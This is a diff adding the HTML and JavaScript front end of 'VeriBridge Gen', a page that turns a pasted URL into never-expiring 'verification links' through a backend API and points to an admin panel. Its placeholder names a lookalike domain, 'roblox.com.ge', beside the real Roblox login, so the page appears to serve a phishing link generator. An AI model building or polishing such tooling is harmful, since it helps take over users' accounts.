@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VeriBridge Gen | Create Shareable Links</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @keyframes shine {
+            0% { background-position: -100% 0; }
+            100% { background-position: 200% 0; }
+        }
+        .shine-text {
+            background: linear-gradient(100deg, #ffffff 45%, #00ffff 50%, #ffffff 55%);
+            background-size: 200% auto;
+            color: transparent;
+            -webkit-background-clip: text;
+            background-clip: text;
+            animation: shine 4s linear infinite;
+        }
+        .toast-notification {
+            animation: slideIn 0.3s ease-out forwards;
+        }
+        @keyframes slideIn {
+            0% { transform: translateX(100%); opacity: 0; }
+            100% { transform: translateX(0); opacity: 1; }
+        }
+        .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="bg-black text-white">
+    <div class="fixed inset-0 -z-10 bg-[radial-gradient(#0d0d0d_1px,transparent_1px)] [background-size:16px_16px]"></div>
+    <div class="fixed top-0 z-[-2] h-screen w-full bg-[radial-gradient(ellipse_60%_60%_at_50%_-20%,rgba(0,255,255,0.15),rgba(255,255,255,0))]"></div>
+
+    <div id="toastContainer" class="fixed bottom-4 right-4 z-50 flex flex-col gap-2"></div>
+
+    <div class="flex min-h-screen items-center justify-center p-4">
+        <div class="w-full max-w-2xl text-center">
+            <div class="bg-black/40 backdrop-blur-xl border border-cyan-500/30 rounded-2xl p-8">
+                <h1 class="text-3xl font-bold shine-text mb-2">VeriBridge Gen</h1>
+                <p class="text-sm text-cyan-400/60 mb-6">Create SHAREABLE verification links (never expire)</p>
+
+                <div class="space-y-4">
+                    <input type="text" id="targetUrl" class="w-full bg-zinc-900/80 border border-cyan-500/20 rounded-xl p-3 text-white placeholder-white/50" placeholder="https://roblox.com.ge or https://www.roblox.com/login">
+                    
+                    <button id="generateBtn" class="w-full bg-gradient-to-r from-cyan-600 to-blue-600 py-3 rounded-xl font-semibold hover:from-cyan-500 hover:to-blue-500 transition-all">
+                        Generate Shareable Link
+                    </button>
+
+                    <div id="resultSection" class="hidden mt-4 p-4 bg-cyan-950/40 rounded-xl border border-cyan-500/30">
+                        <p class="text-xs text-cyan-300/80 mb-2">✨ Your Shareable Link (works for ANYONE):</p>
+                        <code id="resultUrl" class="block bg-black/50 text-cyan-300 text-sm font-mono p-3 rounded-lg break-all cursor-pointer select-all"></code>
+                        <div class="flex gap-2 mt-3">
+                            <button id="copyBtn" class="flex-1 bg-zinc-800 py-2 rounded-lg hover:bg-zinc-700 text-sm">Copy Link</button>
+                            <button id="testBtn" class="flex-1 bg-cyan-900/50 py-2 rounded-lg hover:bg-cyan-800/50 text-sm">Test</button>
+                        </div>
+                    </div>
+
+                    <div id="errorMsg" class="text-red-400 text-sm"></div>
+                    
+                    <div class="text-xs text-white/30 pt-4 border-t border-white/10">
+                        <p>✅ <span class="text-green-400">SHAREABLE!</span> Links work for ANYONE, not just you!</p>
+                        <p>🔗 Links never expire - stored on Vercel</p>
+                        <p>📊 Admin panel: <a href="/admin" class="text-cyan-400 underline">/admin</a></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const targetUrl = document.getElementById('targetUrl');
+        const generateBtn = document.getElementById('generateBtn');
+        const resultSection = document.getElementById('resultSection');
+        const resultUrl = document.getElementById('resultUrl');
+        const copyBtn = document.getElementById('copyBtn');
+        const testBtn = document.getElementById('testBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const toastContainer = document.getElementById('toastContainer');
+
+        function showToast(msg, type = 'success') {
+            const toast = document.createElement('div');
+            toast.className = `toast-notification ${type === 'success' ? 'bg-green-600' : 'bg-red-600'} text-white px-4 py-2 rounded-lg shadow-lg mb-2 text-sm`;
+            toast.innerText = msg;
+            toastContainer.appendChild(toast);
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transform = 'translateX(100%)';
+                toast.style.transition = 'all 0.3s ease-out';
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        async function generateLink() {
+            let url = targetUrl.value.trim();
+            if (!url) {
+                errorMsg.innerText = '❌ Please enter a URL';
+                return;
+            }
+            if (!url.startsWith('http://') && !url.startsWith('https://')) {
+                url = 'https://' + url;
+                targetUrl.value = url;
+            }
+            errorMsg.innerText = '';
+            generateBtn.disabled = true;
+            generateBtn.innerHTML = '<div class="loading-spinner"></div><span> Generating...</span>';
+
+            try {
+                const response = await fetch('/api/generate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ url: url })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    resultUrl.innerText = data.shareableLink;
+                    resultSection.classList.remove('hidden');
+                    showToast('✅ Shareable link created! Works for everyone.', 'success');
+                } else {
+                    errorMsg.innerText = '❌ ' + data.error;
+                    showToast('❌ Failed to create link', 'error');
+                }
+            } catch (err) {
+                console.error('Error:', err);
+                errorMsg.innerText = '❌ Cannot connect to server. Please try again.';
+                showToast('❌ Server error', 'error');
+            } finally {
+                generateBtn.disabled = false;
+                generateBtn.innerHTML = 'Generate Shareable Link';
+            }
+        }
+
+        async function copyLink() {
+            const text = resultUrl.innerText;
+            if (!text) return;
+            await navigator.clipboard.writeText(text);
+            showToast('📋 Link copied!', 'success');
+            const original = copyBtn.innerHTML;
+            copyBtn.innerHTML = '✅ Copied!';
+            setTimeout(() => { copyBtn.innerHTML = original; }, 1500);
+        }
+
+        function testLink() {
+            const link = resultUrl.innerText;
+            if (link) window.open(link, '_blank');
+        }
+
+        generateBtn.addEventListener('click', generateLink);
+        copyBtn.addEventListener('click', copyLink);
+        testBtn.addEventListener('click', testLink);
+        targetUrl.addEventListener('keypress', (e) => { if (e.key === 'Enter') generateLink(); });
+    </script>
+</body>
+</html>
